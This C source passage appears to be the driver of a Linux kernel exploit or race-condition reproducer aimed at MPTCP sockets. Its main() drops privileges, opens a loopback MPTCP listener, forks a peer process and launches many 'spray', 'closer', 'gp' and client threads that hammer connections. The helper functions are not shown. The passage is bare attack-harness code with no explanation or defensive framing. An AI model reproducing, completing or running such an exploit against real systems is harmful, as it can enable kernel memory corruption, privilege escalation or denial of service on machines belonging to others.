static void *client_thread(void *p)
{
	unsigned long n = 0;
	int fds[CONC];

	(void)p;
	pin(CLI_CPU);
	for (;;) {
		one_cycle(fds);
		if ((++n % 200) == 0) {
			printf("cycles=%lu conns=%lu eagain=%lu\n",
			       n_cycles, n_conn, n_eagain);
			fflush(stdout);
		}
	}
	return NULL;
}

int main(void)
{
	struct sockaddr_in a = {
		.sin_family = AF_INET,
		.sin_port = 0,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	socklen_t al = sizeof(a);
	struct rlimit rl;
	pthread_t th[WORKERS];
	unsigned long i;
	int one = 1;

	signal(SIGPIPE, SIG_IGN);
	rl.rlim_cur = rl.rlim_max = 65536;
	setrlimit(RLIMIT_NOFILE, &rl);

	setup_env();

	if (geteuid() == 0 &&
	    (setgroups(0, NULL) || setresgid(65534, 65534, 65534) ||
	     setresuid(65534, 65534, 65534)))
		die("drop privileges");

	listener = socket(AF_INET, SOCK_STREAM, IPPROTO_MPTCP);
	if (listener < 0)
		die("socket(IPPROTO_MPTCP)");
	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	if (bind(listener, (struct sockaddr *)&a, sizeof(a)))
		die("bind");
	if (listen(listener, 4096))
		die("listen");
	getsockname(listener, (struct sockaddr *)&a, &al);
	port = ntohs(a.sin_port);

	printf("uid=%u port=%u\n", (unsigned)getuid(), port);
	fflush(stdout);

	if (!fork())
		peer_main();

	for (i = 0; i < SPRAYERS; i++)
		pthread_create(&th[0], NULL, spray_thread, (void *)(long)(i % 8));
	for (i = 0; i < 4; i++)
		pthread_create(&th[0], NULL, closer_thread, NULL);
	for (i = 0; i < 2; i++)
		pthread_create(&th[0], NULL, gp_thread, NULL);

	for (i = 0; i < WORKERS; i++)
		pthread_create(&th[i], NULL, client_thread, NULL);
	for (i = 0; i < WORKERS; i++)
		pthread_join(th[i], NULL);

	return 0;
}
